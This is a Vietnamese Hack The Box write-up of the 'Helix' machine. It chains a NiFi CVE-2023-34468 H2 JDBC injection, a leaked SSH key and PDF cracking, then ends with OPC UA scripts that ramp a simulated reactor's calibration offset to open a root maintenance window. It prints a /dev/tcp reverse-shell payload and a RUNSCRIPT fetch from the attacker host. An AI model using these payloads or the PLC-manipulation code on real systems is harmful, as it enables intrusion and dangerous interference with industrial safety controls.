# HELIX Machine - HTB

Author: Vo Minh Khang

![image.png](assets/helix-machine-htb/image.png)

## Summary

Trên port 8080 có **Apache NiFi 1.21.0** được proxy qua nginx (`flow.helix.htb`), có thể bị khai thác để có shell với user `nifi`. Trong thư mục `support-bundles` của NiFi có file backup SSH private key của user `operator`. Home directory của `operator` chứa file PDF (`Operator Control & Safety Guide.pdf`) có password-protected  — crack bằng `john` + rockyou ra password `operator1`. PDF tiết lộ procedure để vận hành reactor qua **OPC UA** (port 4840) — cụ thể là set `Mode=MAINTENANCE`, `TestOverride=True` và **`CalibrationOffset` từ từ** để Temperature đạt ~295°C mà không trigger safety trip. Khi điều kiện thỏa, PLC tạo file `/opt/helix/state/maintenance_window`, cho phép chạy `sudo /usr/local/sbin/helix-maint-console` để có root shell.

## Reconnaissance

### Portscanning

Như các bài machine khác, trước khi khai thác mình sẽ đi recon các port đang mở trên $ip được cung cấp. Bằng cách sử dụng nmap với tùy chọn -p-, chúng ta có thể thấy những cổng TCP nào đang mở. 

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T3 -p- $ip

Nmap scan report for 10.129.167.21
Host is up, received echo-reply ttl 63 (0.033s latency).
Scanned at 2026-05-12 22:26:36 EDT for 20s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.03 seconds
           Raw packets sent: 65672 (2.890MB) | Rcvd: 65536 (2.621MB)
```

Output cho thấy các port mở: `22` (SSH), `80` (nginx). Mình chạy tiếp nmap với option -sCV để xem có thể tìm thêm thông tin gì về các port trên không.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -T3 -p 22,80 -sCV $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 22:37 -0400
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTJ+LkpmuH2sQS9dhqnvmpl1NhudGQHvIxfw5Qrhj2MEU4J7VXSPAt/OPas+zeYGU8XOWgNtfnJjHEYe3XsLII=
|   256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGYnLTVO7QjbF2nWYA4R9O3DaSGllmNuBdWKKZyZxMZS
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://helix.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:37
Completed NSE at 22:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:37
Completed NSE at 22:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:37
Completed NSE at 22:37, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)

```

Nhìn output thì mình nghĩ ta phải khai thác được vul trên port 80 rồi ssh. Mình bỏ cái IP cùng với domain của machine vào /etc/hosts rồi truy cập thử port 80.

### Web Enumeration

Vào trang web thì mình thấy trang chủ `helix.htb`chỉ là một **Static HTML page** giới thiệu về công ty Helix Industries. Dạo quanh source code và các endpoint, mình nhận ra trang này hoàn toàn tĩnh, không có form đăng nhập hay bất kỳ bề mặt tấn công nào để khai thác. Hướng đi  nhất lúc này là đi scan **`VHOST/SubDomain`** để tìm kiếm các cổng dịch vụ nội bộ hoặc môi trường dev bị ẩn.

![image.png](assets/helix-machine-htb/image%201.png)

Lúc đầu, khi mình sử dụng ffuf để scan với lệnh cơ bản, mình ngay lập tức gặp khó khăn: mọi payload từ wordlist khi nhét vào header Host: đều trả về HTTP Status 200 với một kích thước (Size) và số lượng từ (Words) y hệt nhau. Terminal của mình bị ngập trong hàng ngàn kết quả.

![image.png](assets/helix-machine-htb/image%202.png)

Để xử lý vấn đề này, nhờ sự trợ giúp của AI thì mình chạy lại ffuz với filter loại bỏ các respone có Size rác nhận được nhiều nhất. Sau khi scan lại thì mình thu thập 1 subdomain là `flow.helix.htb`. Cập nhật lại file `/etc/hosts`. Mình truy cập vào domain mới vừa tìm được.

![image.png](assets/helix-machine-htb/image%203.png)

Truy cập [http://flow.helix.htb](http://flow.helix.htb/) trên trình duyệt, mình bắt gặp ngay giao diện điều khiển của hệ thống dữ liệu Apache NiFi phiên bản `1.21.0`. Research một tí thì mình tìm hiểu được NiFi 1.21.0 có nhiều lỗ hổng đã biết (CVE-2023-34468 và các kỹ thuật abuse processor như `ExecuteScript`, `InvokeScriptedProcessor`).

![image.png](assets/helix-machine-htb/image%204.png)

![image.png](assets/helix-machine-htb/image%205.png)

## Initial Access

### Khai thác NiFi để có RCE

Quá trình research phiên bản Apache NiFi 1.21.0 cho thấy hệ thống này tồn tại lỗ hổng **CVE-2023-34468**. Lỗ hổng này liên quan đến việc NiFi tích hợp sẵn driver của **H2 Database**. Thông qua Controller Services (**DBCPConnectionPool**), mình có thể truyền một chuỗi JDBC URL độc hại chứa tham số **INIT**. Tham số này cho phép tạo Alias và thực thi mã Java/Shell ngay trong quá trình khởi tạo kết nối cơ sở dữ liệu.

Tham khảo: [https://www.sonicwall.com/blog/apache-nifi-code-injection-cve-2023-34468-](https://www.sonicwall.com/blog/apache-nifi-code-injection-cve-2023-34468-)

Mình bắt đầu nghịch nghịch trên giao diện. Thì tìm được nơi Database Connection.

![image.png](assets/helix-machine-htb/image%206.png)

Ban đầu, mình thử nhét trực tiếp toàn bộ payload tạo Alias và gọi Bash Reverse Shell vào thẳng chuỗi URL. Tuy nhiên, cách này không thành công, khả năng cao là do lỗi parsing hoặc escape ký tự đặc biệt khi NiFi xử lý URL.

```bash
#Payload ban dau
jdbc:h2:mem:testdb;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }';CALL EXEC('bash -c "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1"');
```

Vì vậy, mình chuyển sang dùng tính năng **RUNSCRIPT** của H2 để ép target tải payload từ máy Kali của mình về và thực thi.

**Bước 1: Chuẩn bị file payload trên Kali**
Mình tạo một file tên là `exploit.sql` chứa đoạn mã Java để tạo hàm thực thi lệnh (Alias) và gọi reverse shell về cổng 4444:

![image.png](assets/helix-machine-htb/image%207.png)

**Bước 2: Mở Web Server và Listener**
Mở 2 tab terminal riêng biệt trên Kali để host file .sql và đứng đợi shell:

![image.png](assets/helix-machine-htb/image%208.png)

**Bước 3: Cấu hình và kích hoạt Exploit trên NiFi UI**

Truy cập NiFi UI ([http://flow.helix.htb/](http://flow.helix.htb/)). Mình chỉnh sửa cấu hình của Processor đang có. Database Connection URL, mình cấu hình để nó trỏ về file .sql trên máy Kali. Trước khi tiêm payload thì dừng dịch vụ lại để cấu hình.

```bash
jdbc:h2:mem:testdb;INIT=RUNSCRIPT FROM 'http://<KALI_IP>/exploit.sql'
```

Bật lại dịch vụ. Sau khi processor chạy → nhận shell với user **`nifi`**.

![image.png](assets/helix-machine-htb/image%209.png)

### Upgrade Shell

Sau khi nhận được shell thì mình thực hiện các bước cơ bản để upgrade shell hiện có.

```bash
## Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
## Ctrl+Z
stty raw -echo ; fg ; reset
export TERM=xterm
stty columns 200 rows 50
```

## nifi → operator

### Thu thập SSH key từ NiFi support bundle

Đây chỉ là shell chạy dưới quyền của user nifi theo mình thấy chỉ là của dịch vụ nifi thôi. Ta cần tìm cách vào được user thật sự. Mình có xem lại `Controller Service Details` và đọc `/etc/passwd` , thì mình nghĩ ta phải ssh vào được user operator.

![image.png](assets/helix-machine-htb/image%2010.png)

![image.png](assets/helix-machine-htb/image%2011.png)

Enumerate filesystem với quyền user `nifi` . Mục tiêu của mình là tìm kiếm các file cấu hình chứa hardcoded credentials, log file, hoặc các bản backup bị admin "bỏ quên".

```bash
nifi@helix:/opt/nifi-1.21.0$ ls -la
total 380
drwxrwxr-x   16 nifi nifi   4096 May  5 10:18 .
drwxr-xr-x    4 root root   4096 Jan 25 22:58 ..
drwxrwxr-x    2 nifi nifi   4096 May  5 10:18 bin
drwxrwxr-x    3 nifi nifi   4096 May 13 03:39 conf
drwxrwxr-x 1026 nifi nifi  20480 May  5 10:18 content_repository
drwxrwxr-x    2 nifi nifi   4096 May  5 10:18 database_repository
drwxrwxr-x    3 nifi nifi   4096 May  5 10:18 docs
drwxrwxr-x    2 nifi nifi   4096 May  5 10:18 extensions
drwxrwxr-x    4 nifi nifi   4096 May 13 03:50 flowfile_repository
drwxrwx---    6 nifi nifi  12288 May  5 10:18 lib
-rw-r--r--    1 nifi nifi 175405 Apr  3  2023 LICENSE
drwxrwxr-x    2 nifi nifi   4096 May 13 03:12 logs
lrwxrwxrwx    1 nifi nifi     16 Jan 24 21:29 nifi-1.21.0 -> /opt/nifi-1.21.0
-rw-r--r--    1 nifi nifi 110857 Apr  3  2023 NOTICE
drwxrwxr-x    3 nifi nifi   4096 May 13 03:27 provenance_repository
-rw-r--r--    1 nifi nifi   4935 Apr  3  2023 README
drwxrwxr-x    2 nifi nifi   4096 May 13 00:27 run
drwxrwxr-x    3 nifi nifi   4096 May  5 10:18 state
drwxr-x---    2 nifi nifi   4096 May  5 10:18 support-bundles
drwxrwxr-x    5 nifi nifi   4096 May 13 00:27 work
```

Nhờ sự trợ giúp của AI. Thì mình hát hiện thư mục  `support-bundles/` , thư mục này vốn dĩ **không hề tồn tại** trong một bản cài đặt chuẩn.

Có thể đây là một dạng "Misconfiguration" (lỗi cấu hình). Các quản trị viên hệ thống thường tạo ra các file bundle/backup để debug, nhưng sau khi xong việc lại quên dọn dẹp và để lại nguyên hiện trường. Mình thấy chổ này có vẻ tìm năng nên đã đào sâu vào bên trong.

```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls -la
total 12
drwxr-x---  2 nifi nifi 4096 May  5 10:18 .
drwxrwxr-x 16 nifi nifi 4096 May  5 10:18 ..
-rw-r-----  1 nifi nifi  411 Jan 25 13:15 operator_id_ed25519.bak
```

Nằm trong thư mục là một file backup chứa Private Key SSH (`operator_id_ed25519.bak`). Từ đây mình thu thập key để leo sang tài khoản `operator`.

Đọc SSH private key:

```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

### SSH với key tìm được

Lưu key trên Kali và set quyền:

```bash
nano operator_id_ed25519
# paste content
chmod 600 files/operator_id_ed25519

## SSH vào với user operator
ssh -i operator_id_ed25519 operator@$ip
```

![image.png](assets/helix-machine-htb/image%2012.png)

Sao khi vào được user rồi thì mình lấy user flag:

![image.png](assets/helix-machine-htb/image%2013.png)

## Privilege Escalation

### Enumeration ban đầu

```bash
operator@helix:~$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Operator có thể chạy `helix-maint-console` với quyền root, NOPASSWD.

### Phân tích script `helix-maint-console`

```bash
operator@helix:~$ cat /usr/local/sbin/helix-maint-console
```

```bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```

Tiến hành review đoạn script `/usr/local/sbin/helix-maint-console`, mình tóm gọn được logic cốt lõi của nó: Script sẽ cấp cho chúng ta một Interactive Root Shell (thông qua lệnh systemd-run) nếu và chỉ nếu thỏa mãn đồng thời 2 điều kiện:

- File trạng thái `/opt/helix/state/maintenance_window` bắt buộc phải tồn tại.
- Nội dung bên trong file phải chứa một dãy số nguyên (`Unix timestamp`) lớn hơn thời gian hiện tại của hệ thống (tức là thời gian ở tương lai).

Hướng đi nảy ra trong đầu mình lúc này rất đơn giản: Chỉ cần dùng lệnh `echo`để tự tạo cái file đó và chèn một cái **timestamp** cộng thêm 1 tiếng đồng hồ là xong. Thế nhưng, thực tế lại không dễ xơi như vậy:

```bash
operator@helix:~$ ls -la /opt/
drwxr-x---  9 root helixsvc 4096 May  5 10:18 helix
```

Như kết quả trả về, toàn bộ thư mục `/opt/helix/` bị khóa chặt, chỉ cấp quyền cho `root` và group `helixsvc`. Tài khoản `operator` của mình hoàn toàn không có quyền ghi.

### Đọc tài liệu Operator

Nhìn lại phần enum ban đầu mình thấy có 2 file là `'control systems diagram.png`' và '`Operator Control & Safety Guide.pdf`' có vẻ sẽ là hướng đi khác. Nên mình download 2 file này về máy Kali của mình.

![image.png](assets/helix-machine-htb/image%2014.png)

Với file .png thì mình có thể mở một cách bình thường. **PNG** là sơ đồ kiến trúc xác nhận:

- OPC UA endpoint: `opc.tcp://127.0.0.1:4840/helix/`
- Các node Writable: `CalibrationOffset`, `Mode`, `TestOverride`, `ResetTrip`
- Các node Read-only: `RodsInserted`, `EmergencyCooling`, `TripActive`

![diagram.png](assets/helix-machine-htb/diagram.png)

Còn file **PDF** thì cần phải có password để đọc được.

```bash
┌──(kali)-[~/HTB/Helix/files]
└─$ pdfinfo guide.pdf
Command Line Error: Incorrect password
```

### Crack PDF password

Để bẻ khóa file **PDF** này. Đầu tiên, dùng `pdf2john` để trích xuất mã băm (hash) của file, sau đó ném nó cho `John the Ripper`  với wordlist rockyou.txt.

```bash
pdf2john guide.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
john --show pdf.hash
```

![image.png](assets/helix-machine-htb/image%2015.png)

Password: **`operator1`**

Extract nội dung PDF:

![image.png](assets/helix-machine-htb/image%2016.png)

**Nội dung quan trọng từ PDF:**

- **Section 6 — Quy trình kích hoạt (Entering Maintenance Mode):**
Hệ thống không tự nhiên cho phép đổi thông số. Để bắt đầu, mình phải làm đúng 3 bước theo thứ tự:
    1. Đổi biến Mode sang trạng thái MAINTENANCE.
    2. Kích hoạt biến TestOverride (chuyển thành True).
    3. Bắt đầu điều chỉnh hệ thống thông qua biến CalibrationOffset.
- **Section 7 — Maintenance Operating Window:**
    
    Cửa sổ bảo trì (hay chính là cái file mà script yêu cầu) chỉ được PLC mở ra khi thỏa mãn:
    
    - Nhiệt độ chạm ngưỡng **~295°C** HOẶC Áp suất chạm ngưỡng **~73 bar**.
    - BẮT BUỘC phải nằm dưới ngưỡng sập nguồn/báo động (Nhiệt độ < 305°C, Áp suất < 75 bar).
    - Không có cờ báo lỗi an toàn (safety trip) nào đang bật.
- **Section 8 — KEY INSIGHT:**
    
    > 
    > 
    > 
    > Tài liệu có một dòng cảnh báo cực kỳ quan trọng:
    > 
    > *"If the offset is increased too aggressively → PLC will trigger a safety trip... Operators are expected to ramp offsets slowly and observe system feedback."*
    > 
    > Nghĩa là, nếu mình tăng biến CalibrationOffset quá nhanh và đột ngột, hệ thống an toàn sẽ ngay lập tức ngắt điện lò phản ứng (Trip) và vô hiệu hóa mọi thao tác. Việc tăng nhiệt độ bắt buộc phải diễn ra **từ từ, từng bước một.**
    > 

### Khai thác OPC UA theo procedure

`OPC UA` tổ chức dữ liệu thành cây node, mỗi node được định danh bằng `NodeID` dạng ns=X;i=Y. Tài liệu PDF chỉ liệt kê tên biến về mặt logic (Mode, CalibrationOffset...) mà không cho biết `NodeID` tương ứng. Để ghi/đọc giá trị qua OPC UA client, cần biết chính xác `NodeID`. Vì server FreeOpcUa cho phép anonymous browsing mặc định (đây cũng là một security weakness phổ biến của OPC UA implementation), ta có thể chạy script để duyệt cây node và lập bảng mapping NodeID ↔ tên biến trước khi viết exploit chính thức. Sau khi xác nhận target có hổ trợ thư viện `asyncua`. Mình có sự hổ trợ của AI để sinh ra đoạn code sau đây:

```python
# /tmp/browse_deep.py
import asyncio
from asyncua import Client, ua

async def walk(node, depth=0, max_depth=4):
    indent = "  " * depth
    name = await node.read_browse_name()
    try:
        val = await node.read_value()
        try:
            writable = await node.read_attribute(15)  # AccessLevel
            print(f"{indent}{node} → {name.Name} = {val}  [access={writable.Value.Value}]")
        except:
            print(f"{indent}{node} → {name.Name} = {val}")
    except:
        print(f"{indent}{node} → {name.Name}")
    if depth < max_depth:
        try:
            for child in await node.get_children():
                await walk(child, depth+1, max_depth)
        except:
            pass

async def main():
    async with Client(url="opc.tcp://127.0.0.1:4840/helix/") as client:
        plant = client.get_node("ns=2;i=1")
        await walk(plant)

asyncio.run(main())
```

Script hoạt động hoàn hảo ngay từ lần chạy đầu tiên! Kết quả trả về giúp mình mapping được chính xác địa chỉ (NodeID) của từng biến quan trọng.

![image.png](assets/helix-machine-htb/image%2017.png)

### Exploit script

Với danh sách chính xác các `Node ID` đã có trong tay từ bước rà quét trước. Mình tiếp tục tận dụng AI để lên nhanh bộ khung script (các hàm read/write OPC UA cơ bản) theo đúng procedure trong PDF:

```python
# /tmp/proper_procedure.py
import asyncio
from asyncua import Client, ua

NODES = {
    "Mode":         "ns=2;i=12",
    "TestOverride": "ns=2;i=13",
    "CalibOffset":  "ns=2;i=6",
    "Temperature":  "ns=2;i=4",
    "Pressure":     "ns=2;i=5",
    "TripActive":   "ns=2;i=10",
}

async def w(c, nid, val, vt):
    await c.get_node(nid).write_value(ua.DataValue(ua.Variant(val, vt)))

async def r(c, nid):
    return await c.get_node(nid).read_value()

async def main():
    async with Client(url="opc.tcp://127.0.0.1:4840/helix/") as client:
        # Step 1: Mode = MAINTENANCE
        await w(client, NODES["Mode"], "MAINTENANCE", ua.VariantType.String)
        print(f"[1] Mode = {await r(client, NODES['Mode'])}")

        # Step 2: TestOverride = True
        await w(client, NODES["TestOverride"], True, ua.VariantType.Boolean)
        print(f"[2] TestOverride = {await r(client, NODES['TestOverride'])}")

        # Step 3: Ramp CalibrationOffset chậm (+1.0 mỗi 2s)
        offset = 0.0
        while offset < 20:
            offset += 1.0
            await w(client, NODES["CalibOffset"], offset, ua.VariantType.Double)
            await asyncio.sleep(2)
            t    = await r(client, NODES["Temperature"])
            p    = await r(client, NODES["Pressure"])
            trip = await r(client, NODES["TripActive"])
            print(f"  offset={offset:5.1f}  Temp={t:.2f}  Press={p:.2f}  Trip={trip}")
            if trip:
                print("[!] TRIPPED")
                break
            if t >= 295.0:
                print("[+] Window condition reached - holding state")
                # Giữ trạng thái để window không close
                while True:
                    await asyncio.sleep(3)
                    print(f"  [hold] Temp={await r(client, NODES['Temperature']):.2f}")

asyncio.run(main())
```

### Get Root

Để thực hiện leo quyền này thành công, mình bắt buộc phải mở 2 phiên kết nối SSH song song (2 tabs). Vì `/opt/helix/state/maintenance_window`) không tồn tại vĩnh viễn. Nó chỉ được hệ thống PLC tạo ra và duy trì **khi và chỉ khi** nhiệt độ lò đang giữ ở mức nguy hiểm (~295°C).

Chạy script trên SSH session #1 và Mở SSH session #2 (giữ session #1 chạy) để exploit.

![image.png](assets/helix-machine-htb/image%2018.png)

Từ đây thì có thể lấy được root flag rồi.

## References

- [Apache NiFi 1.21.0 Documentation](https://nifi.apache.org/docs.html)
- [OPC UA Specification - asyncua Python library](https://github.com/FreeOpcUa/opcua-asyncio)
- [pdf2john - John the Ripper](https://www.openwall.com/john/)
- [ICS/SCADA Security Fundamentals - SANS](https://www.sans.org/cyber-security-courses/ics-scada-cyber-security-essentials/)

## Kết luận

Vậy là flag root đã có, đánh dấu điểm kết thúc cho Helix.

Helix thực sự là một box cực kỳ chất lượng và mang đậm hơi thở của hệ thống điều khiển công nghiệp thực tế (OT/ICS). Quá trình leo quyền không chỉ đơn thuần là việc nã một chuỗi Exploit có sẵn, mà là sự kết hợp nhịp nhàng giữa khai thác lỗ hổng Web (CVE của hệ thống Apache NiFi) và tư duy đọc code, cộng thêm khả năng đọc hiểu tài liệu vận hành (SOP) cực kỳ chặt chẽ.

Khi đụng độ giao thức OPC UA, mình đã tận dụng sức mạnh của AI khá nhiều để hỗ trợ viết các đoạn script.

Cảm ơn các bạn đã kiên nhẫn theo dõi hành trình "hack lò phản ứng" khá dài và thú vị này. ^_^
